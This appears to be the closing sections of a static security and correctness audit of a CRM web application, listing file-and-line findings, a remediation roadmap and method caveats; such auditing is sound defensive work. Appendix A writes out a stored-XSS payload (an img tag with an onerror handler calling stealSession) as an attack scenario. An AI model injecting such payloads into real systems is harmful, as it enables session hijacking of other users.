- `chunks/script-journey.js:510` (bug) — role_upgrade rule writes a 'role' column prospects don't have — silently no-ops behind a success toast
- `chunks/script-journey.js:630` (logic) — Escalation assignee same-team preference checks users.team_id, which is null org-wide — escalations route to another team's leader
- `chunks/script-journey.js:1190` (logic) — Spawned touchpoint due dates land one day earlier than selected (UTC+8 off-by-one)
- `chunks/script-journey.js:1296` (security) — Team-load panel shows org-wide agent workloads to any Team Leader (no team scoping)

**knowledge+org+settings**

- `chunks/script-knowledge.js:392` (data-integrity) — Detail-editor pending autosave is silently discarded when navigating away — edits lost despite 'Saving…' indicator
- `chunks/script-knowledge.js:760` (bug) — saveCaptureModal calls _kbReloadAll which overwrites the React-managed #kb-all-list node, breaking the All Entries island
- `chunks/script-settings.js:557` (functional) — dedupeEditPhone calls app.openProspectModal, whose script.js stub does not load the prospects chunk — Edit button silently no-ops

**npo+order-form-extract**

- `chunks/script-npo.js:155` (performance) — NPO orders list fetches entire customers and npo_installments tables on every view render
- `chunks/script-npo.js:1016` (data-integrity) — NPO order save is three non-atomic inserts — mid-failure leaves an orphan sale, retry duplicates it
- `chunks/script-order-form-extract.js:708` (bug) — _ofeCleanNum regex \bRM\b fails when a digit follows RM — 'RM3,500.00' parses to null
- `chunks/script-order-form-extract.js:842` (security) — Org-wide unscoped prospect search and history expose all customers' PII to the agent band
- `chunks/script-order-form-extract.js:958` (logic) — activity_date uses UTC (toISOString) — closings before 8:00 AM Malaysia time are dated yesterday

**quarter-review+performance+cases**

- `chunks/script-cases.js:614` (functional) — copyCaseLink generates a deep link whose id parameter is never consumed
- `chunks/script-cases.js:651` (functional) — Add Tag button silently no-ops when the prospects chunk is not loaded
- `chunks/script-cases.js:946` (data-integrity) — New case creation falls back to hardcoded created_by = 1 when session is missing
- `chunks/script-performance.js:96` (logic) — Ranking month window uses UTC date for monthEnd but local date for monthStart
- `chunks/script-performance.js:664` (logic) — Four-pillar matcher: products with empty category match every pillar category
- `chunks/script-performance.js:707` (functional) — Noticeboard 'Post Event' admin button silently no-ops unless the activities chunk is loaded

**script**

- `script.js:2437` (functional) — Push-notification auto-subscribe is dead code — _autoSubscribePush lives in the activities chunk, which is never loaded at either call site
- `script.js:2887` (bug) — _armSessionWatch is only called on the session-restore path — fresh logins never get the dead-session guard
- `script.js:3568` (functional) — _VIEW_RENDER has no 'customers' entry — navigateTo('customers') renders the raw placeholder page
- `script.js:4303` (bug) — showForcePasswordChangeModal stub recurses if the agents chunk loses the prefetch race — forced password change silently skipped

**two-factor+index**

- `index.html:670` (functional) — two-factor.min.js loads after script.min.js, so all six app.* 2FA bindings are baked as 'not available' stubs
- `two-factor.js:480` (bug) — enableTOTP is called with window._currentUser?.id but window._currentUser is never set — enabling 2FA always fails

**ui+app-init**

- `app-init.js:536` (bug) — resolveAttachmentImages: image hidden by a failed resolve is never un-hidden when a later retry succeeds
- `ui.js:31` (bug) — escJsAttr escapes '&' LAST, double-escaping the '&quot;' it just produced — double quotes in data arrive corrupted as literal '&quot;'

---

## 5. Confirmed LOW-severity findings (135)

<details><summary>Expand full low-severity list</summary>


**agents+features2**

- `chunks/script-agents.js:361` (functional) — Agent profile renders fabricated placeholder data as real (license 2026-12-31, fake phone/email, hardcoded activity history)
- `chunks/script-agents.js:1155` (bug) — saveAgent refreshes the agents table after an edit launched from the profile view, leaving the profile stale
- `chunks/script-agents.js:1431` (bug) — saveAgentTargets parseInt with no fallback — clearing a field writes NaN→null and wipes the target
- `chunks/script-features2.js:426` (logic) — autoExtendProtection computes dates in UTC — one-day-short extensions for Malaysia (UTC+8) before 8am
- `chunks/script-features2.js:1340` (logic) — Special-program eligibility regex excludes Chinese-only L12 role ä¼ ç¦å¤§ä½¿

**approvals+admin**

- `chunks/script-admin.js:476` (functional) — submitNewTenant toasts 'Tenant provisioned successfully' when nothing was persisted (TenantManager does not exist)
- `chunks/script-approvals.js:298` (bug) — new_sale branch dereferences entry.snapshot_after without the null guard its sibling branch received
- `chunks/script-approvals.js:676` (performance) — Full-table getAll('approval_queue') + client-side find to locate one pending row

**auth+data-helpers+push-notifications+sw+build**

- `push-notifications.js:77` (bug) — subscribe()/unsubscribe()/getStatus() hang forever when SW registration failed
- `push-notifications.js:243` (logic) — getStatus offline fallback is unreachable — returned query errors report subscribed:false

**boss-report+forms+whatsapp**

- `chunks/script-forms.js:321` (bug) — Survey results table renders 'undefined/10' for non-scored responses
- `chunks/script-whatsapp.js:285` (data-integrity) — openSendWhatsAppModal writes seed templates whenever the template read returns empty
- `chunks/script-whatsapp.js:478` (bug) — syncWhatsAppTemplates guards on phone_number_id but the request requires business_account_id (and puts the access token in the URL)

**activities**

- `chunks/script-activities.js:673` (bug) — Clearing the venue in updateActivity leaves the stale mirror in location_address, so the venue resurrects on the next edit
- `chunks/script-activities.js:1039` (logic) — Assign-on-behalf picker excludes Level-12 agents (lvl > 11) though the agent band is L3-L12
- `chunks/script-activities.js:3530` (data-integrity) — confirmAddAttendee has no duplicate guard, unlike the consultant path — the same person can be added as attendee multiple times
- `chunks/script-activities.js:4506` (data-integrity) — saveActivity falls back to hard-coded lead_agent_id 5 when _state.cu is missing

**ai**

- `chunks/script-ai.js:473` (bug) — initAIAnalytics is dead code — ensureAIModelsExist never runs, so ai_models is never seeded
- `chunks/script-ai.js:1128` (performance) — batchUpdateLeadScores is O(N²): full lead_scores table refetched per prospect inside a sequential await loop
- `chunks/script-ai.js:1172` (logic) — Batch scoring filters status === 'active', inconsistent with the dashboard's own 'active prospect' definition
- `chunks/script-ai.js:1939` (data-integrity) — Hardcoded fallback lead_agent_id: 5 misattributes AI-created activities to a real user
- `chunks/script-ai.js:2022` (data-integrity) — exportForecast always persists a 'quarterly' forecast_history row regardless of the period the user viewed/exported

**calendar**

- `chunks/script-calendar.js:687` (logic) — Voucher-nudge dedup shares the raw event_id key with event invites — cross-id-space collision suppresses drafts
- `chunks/script-calendar.js:1757` (logic) — Follow-up engine still computes 'today' via toISOString (UTC) in several dispatchers — off-by-one-day before 08:00 MYT
- `chunks/script-calendar.js:3401` (bug) — Birthday card falls back to fictional agent name 'Michelle Tan' when the owner lookup misses
- `chunks/script-calendar.js:3409` (logic) — Family-member birthday cards send the wish addressed to the parent contact's name
- `chunks/script-calendar.js:4833` (performance) — viewActivityDetails attendee section fetches five whole tables on every EVENT modal open
- `chunks/script-calendar.js:6322` (bug) — savePostMeetupNotes leaves the Save button permanently disabled after a write failure
- `chunks/script-calendar.js:6865` (data-integrity) — postEventFollowUp discriminates prospect vs customer via nonexistent is_customer field — customers would be linked as prospects

**customers**

- `chunks/script-customers.js:662` (functional) — Header fabricates 'Converted at RM 2,200' when conversion_amount is null
- `chunks/script-customers.js:878` (security) — Bank account masking fails open — non-conforming account numbers render fully unmasked
- `chunks/script-customers.js:947` (functional) — Agent Eligibility accordion shows hardcoded fake data ('Not an Agent', '85% Good candidate') for every customer
- `chunks/script-customers.js:975` (functional) — Notes buttons (addCustomerNote/deleteCustomerNote/openVoiceRecorder) depend on the mobile chunk prefetch with no stub or reload path
- `chunks/script-customers.js:1541` (bug) — Quote-nesting breakout: remove (×) button on newly added platform rows has a truncated onclick

**egg**

- `chunks/script-egg.js:962` (security) — Uploaded filename interpolated into innerHTML unescaped on legacy Phase 1
- `chunks/script-egg.js:2333` (security) — Config JSON injected into <textarea> without escaping — '</textarea>' in a config string breaks out

**formula**

- `chunks/script-formula.js:211` (logic) — 'Today' derived from UTC ISO string — off by one day before 8am Malaysia time
- `chunks/script-formula.js:1184` (bug) — Index-based fpExecuteTransfer onclick goes stale while another transfer is in flight
- `chunks/script-formula.js:1324` (performance) — Stock Inquiry re-renders the full 300-row table with O(rows x stockBalance) scans on every keystroke
- `chunks/script-formula.js:2080` (logic) — POS dedup key silently drops legitimate duplicate line items within the same receipt

**fude**

- `chunks/script-fude.js:139` (functional) — 'See all news →' link in the Highlights carousel has no href and no handler — dead control
- `chunks/script-fude.js:977` (data-integrity) — submitRecruitmentApproval scrapes the whole document — getElementById('modal-content') never matches
- `chunks/script-fude.js:1424` (performance) — Forms-tab search re-fetches five whole tables and rebuilds the 200-row list on every keystroke
- `chunks/script-fude.js:1744` (bug) — Existing signature wiped to null if Save is clicked before the async signature preload finishes
- `chunks/script-fude.js:1746` (data-integrity) — created_by / author_id overwritten with the current editor on every update across all five form save functions

**import**

- `chunks/script-import.js:363` (functional) — Step-3/step-5 import option checkboxes are dead — 'Create backup before import', 'Stop on first error', notifications and audit-log toggles are never read
- `chunks/script-import.js:384` (logic) — Navigating Back to step 2 resets the mapping dropdowns to auto-match defaults, silently discarding the user's custom mapping
- `chunks/script-import.js:630` (data-integrity) — Duplicate-'update' payload writes lifetime_value with no Math.max(0,…) clamp and no purchases/adjustCustomerLtv reconciliation
- `chunks/script-import.js:892` (data-integrity) — Intra-file dedup falls back to a name-only key — two different people with the same name are silently collapsed to one when phone/IC aren't mapped
- `chunks/script-import.js:1072` (functional) — downloadImportLog shows 'Import log downloaded' success toast without downloading anything
- `chunks/script-import.js:1936` (bug) — quickReassign locates its dropdown with a substring attribute selector — prospect id 12 matches the dropdown for id 123/125

**marketing**

- `chunks/script-marketing.js:1024` (bug) — Product photo/poster upload failures are silently swallowed — success toast still shown
- `chunks/script-marketing.js:1722` (bug) — switchMarketingTab race: a slow earlier tab render overwrites the newer tab's content
- `chunks/script-marketing.js:1746` (bug) — Forms tab renders the literal text 'undefined' when script-fude is not loaded (legacy/scaffold path)
- `chunks/script-marketing.js:4617` (bug) — exportAnalyticsReport CSV rows are unquoted — commas/newlines in campaign names corrupt columns

**mobile**

- `chunks/script-mobile.js:345` (bug) — saveTranscription shows 'Voice note saved' success toast even when the note create failed
- `chunks/script-mobile.js:350` (data-integrity) — createNoteFromVoice reads author from Supabase auth user, so every voice note is attributed to 'System'
- `chunks/script-mobile.js:647` (functional) — Level 11 users get a hardcoded 'Insights' bottom-nav tab for the reports view they are not allowed to open
- `chunks/script-mobile.js:2045` (logic) — Calendar people cache omits customer_since, silently breaking _dedupClientByBday's prefer-customer rule
- `chunks/script-mobile.js:2732` (bug) — Unquoted tmp- ids in mcalOpenEvent onclick produce a ReferenceError for unsynced optimistic rows
- `chunks/script-mobile.js:3371` (functional) — Mobile client list hard-caps at 60 cards with no pagination or 'showing N of M' indicator

**pipeline**

- `chunks/script-pipeline.js:611` (performance) — runHuiJiMigration re-downloads the entire activities + events tables every session, forever
- `chunks/script-pipeline.js:788` (bug) — Probability badge color/label band mismatch reintroduced on the default JSX path (50-59% = WARM label in COLD grey)
- `chunks/script-pipeline.js:1808` (bug) — saveActionPlan edit path discards a changed month and crashes if the plan row is gone
- `chunks/script-pipeline.js:3047` (logic) — handleDrop and submitBoost re-rank my_potential_list across ALL months, contradicting the per-month scoping in removeFromFocusList
- `chunks/script-pipeline.js:3250` (functional) — filterExpiredSearch's tr:not(:first-child) exempts the first data row of every table from search filtering

**prospects**

- `chunks/script-prospects.js:550` (logic) — Table row and Personal tab fabricate 'MG4' for prospects with no Ming Gua
- `chunks/script-prospects.js:1107` (performance) — Prospect delete downloads the entire notes table
- `chunks/script-prospects.js:1546` (logic) — openProspectModal edit gate contradicts the canEditProspect policy for L6-L10 leads
- `chunks/script-prospects.js:3729` (bug) — Operator precedence makes the 'No closing records yet.' fallback unreachable
- `chunks/script-prospects.js:4018` (bug) — compressImageFile never settles on image decode failure — photo upload hangs silently

**referrals**

- `chunks/script-referrals.js:693` (bug) — searchTreePerson dereferences the results element without a null check
- `chunks/script-referrals.js:704` (performance) — Tree search pulls full prospects+customers tables and runs visibleIds.map(String) inside the filter per row
- `chunks/script-referrals.js:1144` (functional) — treeResetZoom restores a different transform than the initial render
- `chunks/script-referrals.js:1607` (data-integrity) — submitReferral allows self-referrals and duplicate referrals for the same referred prospect
- `chunks/script-referrals.js:1786` (security) — CSV export does not neutralize formula-leading cells (CSV injection)

**reporting**

- `chunks/script-reporting.js:2344` (logic) — New Agents drill-down lacks the null join_date guard the card getter has
- `chunks/script-reporting.js:3043` (performance) — Target Overview issues four sequential awaited per-quarter aggregations on every dashboard refresh
- `chunks/script-reporting.js:3630` (data-integrity) — quarterly_targets.yearly_target_id is always written as undefined

**search**

- `chunks/script-search.js:1600` (performance) — Attendance filter: unbounded event_attendees fetch plus O(activities x attendees) nested scan
- `chunks/script-search.js:2222` (functional) — Event search result rows can never open a detail view — app.showEventDetail does not exist anywhere

**stock-take**

- `chunks/script-stock-take.js:1219` (security) — CSV exports don't neutralize formula-leading cells (CSV/formula injection into Excel)
- `chunks/script-stock-take.js:1693` (bug) — Summary renders a counted quantity of 0 as '—' (looks uncounted) in the QR and Bulk columns
- `chunks/script-stock-take.js:1916` (bug) — stScanShelfAndCount: unguarded await _stV2Load() — on fetch failure the Scan Shelf button silently does nothing (unhandled rejection)
- `chunks/script-stock-take.js:1958` (bug) — _stAttr (onclick-context escaper) used for the plain data-sku attribute — SKUs containing apostrophes/backslashes are saved corrupted

**data**

- `data.js:757` (performance) — Static-table cache TTL is inverted: near-static tables (users, roles, products…) expire at 120s while mutable tables get 300s
- `data.js:3752` (functional) — spawnTouchpointsForStage and the assigned_to filters write/compare numeric CRM ids against a column the checked-in migration declares UUID — any environment rebuilt from migrations silently breaks all journey assignment

**dim:build-deploy**

- `sw.js:37` (bug) — Precached '/fonts/local-fonts.css' can never match the page's actual request URL ('?v=20260531o') — dead precache entry, fonts unavailable in the offline shell
- `vercel.json:132` (functional) — buildCommand silently swallows vite failures and brotli-compresses react-island.js BEFORE vite overwrites it; also contradicts the documented build model

**dim:data-perf**

- `data.js:757` (performance) — Cache TTL inversion: 'near-static' tables expire at 120s while mutable tables get 300s
- `data.js:993` (data-integrity) — Delta-sync cursor is stamped from the client clock — a fast client clock skips other users' writes

**dim:error-handling**

- `chunks/script-customers.js:1563` (bug) — savePlatformIds: unguarded AppDataStore.delete in a multi-row loop — thrown 'permission_denied' aborts mid-save with no feedback and a partial write

**dim:leaks-timers**

- `chunks/script-marketing.js:4551` (performance) — Marketing Analytics Chart.js instances are never destroyed — Chart's global registry grows on every tab visit
- `data.js:1585` (performance) — Offline-banner visibilitychange/pageshow listeners strand when recovery happens via a successful read

**dim:load-perf**

- `index.html:82` (performance) — Head preload of script.min.js negates the fetchpriority="low" on its script tag, contradicting the stated FCP strategy
- `styles-login-v2.css:252` (bug) — ~105 app-wide rules duplicated verbatim between styles-mobile.css and styles-login-v2.css — later copy silently overrides edits to the first
- `sw.js:37` (bug) — Install precache entries can never be served: query-string mismatch and STATIC_CACHE is never consulted by the asset fetch paths

**dim:money-dates**

- `chunks/script-activities.js:355` (bug) — Activity/case date pickers default to the UTC day — yesterday for MY users before 08:00
- `chunks/script-activities.js:4665` (logic) — CPS protection deadline computed in UTC is one local day short; assignment date can be stamped yesterday
- `chunks/script-customers.js:1877` (bug) — Installment maturity _addMonths does not clamp day-of-month overflow (unlike the NPO version)

**dim:react-island**

- `src/react/main.jsx:519` (performance) — Island roots outlive their views: singleton journey/fude roots have no callers for their unmount fns, and _roots pruning is deferred to the next mount

**documents+cps**

- `chunks/script-cps.js:114` (logic) — Birthday badge/panel double-counts people who exist as both prospect and customer
- `chunks/script-documents.js:487` (bug) — showVersionHistory and openShareModal dereference a possibly-null document record
- `chunks/script-documents.js:714` (functional) — Header select-all checkbox can never be unchecked — onchange always re-selects everything

**gcal+journey**

- `chunks/script-gcal.js:33` (bug) — Synced Google events always get an empty description — light-select omits discussion_summary
- `chunks/script-gcal.js:163` (functional) — Deleting a CRM activity never deletes its Google Calendar event
- `chunks/script-gcal.js:574` (functional) — Saved 'Sync Calendar' and 'Default Reminder' settings are neither restored into the form nor used
- `chunks/script-gcal.js:772` (functional) — Sync-history date-range filter (7/30/90 days) and Apply button filter nothing
- `chunks/script-journey.js:324` (logic) — recalcProspectScore weight keys never match real activity types, and decay math zeroes weights within days

**knowledge+org+settings**

- `chunks/script-knowledge.js:531` (logic) — convertKnowledgeEntry toasts 'Converted to X' even when saveKnowledgeEntry failed or was rejected by validation
- `chunks/script-knowledge.js:636` (logic) — kbShiftDailyDate parses 'YYYY-MM-DD' with new Date() (UTC midnight) then uses local-time getters — day navigation skips/repeats dates in negative-UTC timezones
- `chunks/script-knowledge.js:751` (bug) — saveCaptureModal omits the null-owner guard every sibling function has — inserts owner_id: null on a dead session
- `chunks/script-settings.js:96` (bug) — selfChangePassword dereferences the password inputs without null checks after two awaits — crashes if the user navigated away
- `chunks/script-settings.js:453` (bug) — Email-dupe rows from the _fs_email_dupes RPC carry lead_agent_id, but the renderer reads p.responsible_agent_id — Agent column always '—'

**npo+order-form-extract**

- `chunks/script-npo.js:548` (performance) — npoSaveEligibleProducts issues one sequential await per product (N+1) with partial-save on failure
- `chunks/script-order-form-extract.js:851` (logic) — entityType check tests status 'customer' which never exists — customer branch is dead, customers always mislabeled Prospect
- `chunks/script-order-form-extract.js:1129` (bug) — ofeSetStatus leaves optimistic 'Collected' badge painted when the 42703 migration-missing path returns early
- `chunks/script-order-form-extract.js:1206` (bug) — Scan preview blob URL revoked after 90 s while still rendered and zoomable

**quarter-review+performance+cases**

- `chunks/script-cases.js:298` (logic) — 'Date To' filter excludes cases on the boundary day when falling back to created_at
- `chunks/script-cases.js:460` (security) — showCaseStudyDetail / toggleCasePublic / deleteCaseStudy have no visibility or permission gate
- `chunks/script-performance.js:572` (performance) — computeNineMethodStatuses pulls five entire tables to answer one subject's status
- `chunks/script-performance.js:793` (logic) — Noticeboard expiry cutoff uses the UTC date, keeping expired events visible until 8am MYT
- `chunks/script-quarter-review.js:218` (logic) — Selecting files a second time silently discards everything previously loaded
- `chunks/script-quarter-review.js:352` (bug) — _ingestOnline detects columns tolerantly but reads them by exact literal key
- `chunks/script-quarter-review.js:582` (security) — Wholesale product names are interpolated into HTML without escaping

**script**

- `script.js:156` (bug) — Perf.guardAsync save/restore uses innerText, permanently destroying icon children of every guarded button
- `script.js:3614` (security) — 'ai_prediction' render alias bypasses the VIEWS authorization gate for the L1/L2-only AI Insights dashboard
- `script.js:4333` (bug) — showRoadmap stub recurses into stack overflow when clicked before the fude chunk loads

**two-factor+index**

- `two-factor.js:151` (security) — TOTP secret is stored in cleartext when the Encryption module is absent — the fail-closed guard only fires on exception
- `two-factor.js:441` (security) — TOTP shared secret is transmitted to third-party api.qrserver.com
- `two-factor.js:522` (security) — escAttr does not escape double quotes or HTML entities — password with a double quote breaks out of the onclick attribute
- `two-factor.js:537` (functional) — app.showBackupCodeLogin / app.verifyBackupCodeLogin are never registered on the app object — backup-code login is permanently dead
- `two-factor.js:556` (logic) — 2FA login verification queries the users table before any Supabase session exists — RLS returns zero rows so a correct code is always rejected

**ui+app-init**

- `app-init.js:229` (bug) — Unguarded localStorage.getItem in theme init can throw and kill the DOMContentLoaded handler
- `ui.js:140` (bug) — Info toasts do not release button loading state — Save/Send buttons stay disabled with a spinner for the full 10s safety window

</details>

---

## Appendix A — Findings that remain genuinely uncertain (4)

These passed through adversarial verification but could not be settled from source alone — each turns on live database / RLS behavior. Worth a quick spot-check against production; the client-side half of each is already verified.

- 🟠 **HIGH** `chunks/script-import.js:578` (data-integrity) — Prospect import sends empty string '' for blank Date of Birth cells — rows fail server insert but are counted as created (local-only phantom rows)  
  *Import a prospects file using the official template (which includes a 'Date of Birth' column, auto-mapped) where some rows have blank DOB. The import toast reports all rows created, but every blank-DOB prospect exists only in this browser's localStorage and a permanently-failing sync-queue entry — no other device or user ever sees them, and the sync queue is poisoned with a row that can never insert.*
  Verifier note: The client-side chain is fully verified: prospects branch line 578 lacks '|| null' (unlike customers line 548 and expected_close_date line 591); createMany bulk failure falls back to per-row add(); add() (data.js 2076-2232) has no handler for a 22007 date-syntax error, so after the retry loop it saves to localStorage + sync queue and RETURNS the record, which startImport counts as created. But whether the server actually rejects '' depends on the live column type of prospects.date_of_birth, which conflicting repo artifacts leave undetermined: the original DDL doc declares it DATE, yet the deployed edge function send-activity-reminders filters the same column with like.*-MMDD (valid only on text), and since get() returns '' even for UNMAPPED DOB, every wizard prospect import ever run would have produced only phantom local rows if the column were DATE — a catastrophic symptom none of this file's many import audits recorded. Cannot resolve live DB state from code alone.
- ⚪ **LOW** `chunks/script-boss-report.js:127` (logic) — Order Tracking region logic ignores the parsed States column — all shipped orders (including Penang deliveries) count as KL  
  *Ten cartons of Ocean sold are ordered online with delivery addresses in Penang. The boss report deducts all ten from KL's balance and none from PG's, so the PG Balance line overstates stock and KL's understates it every week such orders exist.*
  Verifier note: The code facts are true: `state` (chunks/script-boss-report.js:127) is read and never used, and region is decided solely by Self Collection containing 'Bay Avenue, PG' (130-131), else KL. But whether a Penang-address SHIPPED order should deduct PG stock is a business/fulfillment question the code cannot answer — if all non-self-collection online orders ship from the KL warehouse (consistent with the formula2u/mbb marketplace strings appearing in the same Self Collection field), KL deduction is correct and the States column is merely informational. A dead variable alone does not prove the bucketing is wrong; depends on the user's warehouse model.
- ⚪ **LOW** `chunks/script-whatsapp.js:70` (functional) — "Back to Integrations" button calls app.showIntegrationHub which lives only in the gcal chunk with no lazy stub  
  *The app lands directly on the whatsapp view (e.g. restored view state after a reload) without the gcal chunk loaded. The user clicks 'Back to Integrations' — nothing happens, no error shown, and they are stuck navigating via the main menu.*
  Verifier note: no verdict returned
- ⚪ **LOW** `ui.js:338` (security) — UI.formatDate returns raw unescaped input when the value fails Date parsing — XSS sink  
  *An import (or a compromised low-level account writing through a free-text path) stores `<img src=x onerror=stealSession()>` in a prospect's next_follow_up/date column. new Date() yields NaN, formatDate returns the payload verbatim, the prospect list template injects it into innerHTML, and the script executes in every viewer's session — stored XSS reachable by managers/admins viewing the row.*
  Verifier note: The code facts are exact: ui.js:338 `if (isNaN(date.getTime())) return d;` returns the raw value unescaped, and callers interpolate the result directly into innerHTML (e.g. chunks/script-prospects.js:2643-2645 rendered unescaped at :2661-2662). However, exploitability is not demonstrated: a survey of ALL un-minified formatDate call sites (31 calls in script-import/marketing/referrals/prospects chunks) shows every input is a server-set timestamp (created_at, sent_at, completed_at written via new Date().toISOString()) or a DB date column (cps_assignment_date, protection_deadline, reassignment_date, start_date/end_date, purchases.date). migrations/long_term_integrity_2026-04-24.sql explicitly converts the cited columns (cps_assignment_date, protection_deadline, closing_date, etc.) from DATE to TIMESTAMPTZ — typed Postgres columns reject markup strings at write time, so the claimed 'import stores <img onerror> in a date column' would fail the insert. Also, no formatDate(next_follow_up) call exists anywhere, so the specific failure scenario as written cannot occur. Whether some formatDate-fed column (e.g. promotions.start_date, users.join_date, whatsapp sent_at) is text-typed can only be determined from the live DB schema, so the latent escape gap cannot be fully refuted from code alone.

---

## 6. Prioritized remediation roadmap

### P0 — this week (data integrity & security; small, surgical)
1. **Split offline vs permanent-rejection in `data.js` add()/update()`** (Theme B, critical). Stop reporting server-rejected writes as success. Highest data-loss risk.
2. **Fix the self-referencing / passive cross-chunk stubs** (Theme A). Convert `uploadProspectDocument`, `showForcePasswordChangeModal`, `showRoadmap` from self-recursing to self-loading; convert the passive stubs (customer accordions, Portal Link, deleteFile, bulk reassign, submit-recruitment, import/export, quick capture, openEditSolutionModal) to self-loading. One shared `_lazyStub` factory.
3. **Initialize the notification bell on every login path** (`_initNotifBell`), not just session-restore, and load its chunk eagerly or via a self-loading stub.
4. **Escape the XSS sinks** (Theme E): Edit-Agent modal fields, EPP bank pills, approval label, egg group name/config, fude story tags, NPO customer search, quarter-review/knowledge names. Fix `escJsAttr` ordering.
5. **Add the missing authz gates** (Theme F): `setAgentPackageAmount`, `ranking`/Ranking Performance view, `rejectClosingRecord`/`rejectProspectConversion`, Special-Program mutations, WhatsApp Forward & order-form PII search.
6. **Agent role `<select>` must not default to Super Admin** (App. A) — pre-select the stored role or an explicit "— choose —" placeholder; validate on save.

### P1 — this sprint (correctness on common paths)
7. **Central date helpers** (Theme C) and replace every UTC day/month/quarter computation — purchases, activities, KPI buckets, NPO installments, protection deadlines, calendar navigation.
8. **Composite `type:id` keys** everywhere prospect/customer/user collections merge (Theme D); fix `openProspectModal(customer.id)`, mobile people map, referral tree lookups.
9. **Paginate `query()`/`getAllSince()`** (Theme G) — fixes egg duplicate-order over 1000 rows and silent delta-sync drops.
10. **Idempotency + atomic commits** for NPO order, CPS save, approval booking, order-form closing (Theme H). Stamp `lead_agent_id` on order-form closings.
11. **`invalidateCache` after write wiping the local mirror** (`data.js`) — don't delete the snapshot you just wrote; keep the row + cursor so offline saves survive re-render.
12. **Stock-take multi-device integrity**: backfill `st_counts` on subscribe, propagate deletes/supersedes, don't zero uncounted SKUs in the ERP adjustment export, refresh the JSX view after modal mutations.

### P2 — this quarter (performance & UX)
13. **Debounce + scope search refetches**, replace N+1 `getById` loops with batched `in` queries (Theme I). Prioritize Delivery Listing, search filters, pipeline team sections, referral leaderboard, gcal sync.
14. **Build/deploy cache coherence** (Theme J): stop marking unversioned bundles immutable; exclude `crm-data-*` from SW purge; auto-bump `?v=` from a content hash in `build.mjs`.
15. **Wire up the many 'saved but never read' settings** (import options, alert thresholds, WhatsApp schedule, Google sync direction, package Visible-To) — either implement or remove the controls so they don't imply function they lack.
16. **Fix the false-success toasts** across egg/mobile/whatsapp/marketing/features2/tenant flows (subset of Theme B).

### P3 — backlog (hardening)
17. 2FA: stop sending the TOTP secret to `api.qrserver.com`; encrypt at rest (fail-closed); register/repair backup-code login; the pre-session RLS verification query.
18. CSV/formula-injection neutralization on all exports (stock-take, referrals, quarter-review, analytics).
19. Dead-code / dead-control cleanup (initAIAnalytics, validatePasswordStrength, 'See all news', event detail view, copyCaseLink deep link).
20. Add the two CI guards implied above (cross-chunk stub coverage; banned UTC/`innerHTML` patterns) so these classes can't regress.

---

## 7. Method, caveats & confidence

- **Coverage:** 41 audit areas — 19 large files audited solo, 11 grouped file-sets, 11 cross-cutting dimensions. ~9.7M tokens of audit across 3 resumed runs.
- **Verification:** every finding was re-checked by an independent adversarial verifier reading the actual code (final pass on Opus 4.8); **29 were refuted** and excluded, and only **4 remain uncertain** (App. A) pending a live-DB check. Verification is complete across all 41 areas.
- **Static only:** this is a source audit. Findings that depend on live DB state or RLS policy (marked in the data) should be confirmed against production before/after fixing. The live-site fetch dimension could not be fully verified.
- **Not audited:** `.min.js`/`.br`/hashed build outputs (generated), and SQL migration internals beyond what the client references.
- **No code was changed and nothing was committed** — this is report-only, per the shared working directory.